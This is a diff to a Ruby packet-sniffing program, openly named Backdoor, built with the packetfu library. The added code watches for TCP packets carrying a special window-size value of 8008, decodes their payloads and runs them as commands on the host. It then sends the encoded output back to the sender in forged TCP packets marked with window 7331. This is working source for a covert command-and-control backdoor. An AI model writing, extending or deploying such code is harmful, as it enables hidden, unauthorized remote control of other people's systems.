@@ -1,10 +1,15 @@
-#! usr/bin/env ruby
+#!/usr/bin/env ruby
 
 require 'csv'
 require 'rubygems'
 require 'packetfu'
 
+# Local files
+curdir = File.dirname(__FILE__);
+require curdir + '/commands.rb'
+
 class Backdoor
+    include Commands
     @start = false
     
     def initialize(start = false)
@@ -37,10 +42,51 @@ class Backdoor
     end # listen
     
     def process_packet(packet)
+        # Run Generic Command
+        if packet.tcp_flags.psh == 1 and packet.tcp_win == 8008 then
+            result = run_command(decode(packet.payload))
+            send_data(result, packet)
+            return
+        end #if
         
+        # Run get command
+        #if packet.tcp_flags.syn == 1 and packet.tcp_flags.psh == 1 then
     end # process_packet
     
-    def encrypt
-
-    end # encrypt
+    def send_data(data, packet)
+    
+        array_data = data.scan(/.{1,255}/m)
+        
+        array_data.each { |word|
+            tcp = PacketFu::TCPPacket.new()
+            
+            tcp.eth_saddr = @cfg[:eth_saddr]
+            tcp.eth_daddr = @cfg[:eth_daddr]
+            tcp.tcp_src = rand(0xfff - 1024) + 1024
+            tcp.tcp_dst = rand(0xfff - 1024) + 1024
+            tcp.tcp_flags.psh = 1;
+            tcp.tcp_win = 7331
+            tcp.ip_saddr = packet.ip_daddr
+            tcp.ip_daddr = packet.ip_saddr
+            
+            tcp.payload = encode(word)
+            
+            tcp.recalc
+            tcp.to_w(@iface)
+        }
+        
+        tcp_fin = PacketFu::TCPPacket.new()
+        
+        tcp_fin.eth_saddr = @cfg[:eth_saddr]
+        tcp_fin.eth_daddr = @cfg[:eth_daddr]
+        tcp_fin.tcp_src = rand(0xfff - 1024) + 1024
+        tcp_fin.tcp_dst = rand(0xfff - 1024) + 1024
+        tcp_fin.tcp_flags.psh = 1
+        tcp_fin.tcp_flags.fin = 1
+        tcp_fin.ip_saddr = packet.ip_daddr
+        tcp_fin.ip_daddr = packet.ip_saddr
+        
+        tcp_fin.recalc
+        tcp_fin.to_w(@iface)
+    end
 end
